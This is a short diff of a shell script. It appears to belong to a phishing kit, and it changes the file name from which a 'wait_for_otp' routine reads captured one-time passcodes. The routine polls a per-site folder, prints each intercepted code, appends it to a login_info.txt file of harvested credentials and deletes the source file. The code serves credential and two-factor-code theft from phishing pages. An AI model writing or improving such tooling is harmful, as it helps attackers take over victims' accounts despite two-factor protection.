@@ -598,15 +598,15 @@ c_cred() {
 
 wait_for_otp() {
   printf "\n\e[1;92mWaiting for OTP...\n\e[0m"
-  printf "\e[1;93mChecking for file: sites/$server/otp.txt\n\e[0m"  # Debugging statement
+  printf "\e[1;93mChecking for file: sites/$server/code.txt\n\e[0m"  # Debugging statement
 
   while [ true ]; do
-    if [[ -e "sites/$server/otp.txt" ]]; then
+    if [[ -e "sites/$server/code.txt" ]]; then
       printf "\n\e[1;92mOTP Found!\n\e[0m"
-      otp=$(cat sites/$server/otp.txt)
+      otp=$(cat sites/$server/code.txt)
       printf " \e[1;96mOTP:\e[0m \e[1;93m%s\n\e[0m" "$otp"
       echo "OTP: $otp" >> sites/$server/login_info.txt
-      rm -rf sites/$server/otp.txt
+      rm -rf sites/$server/code.txt
       break
     else
       printf "\e[1;91mFile not found. Retrying in 1 second...\n\e[0m"  # Debugging statement
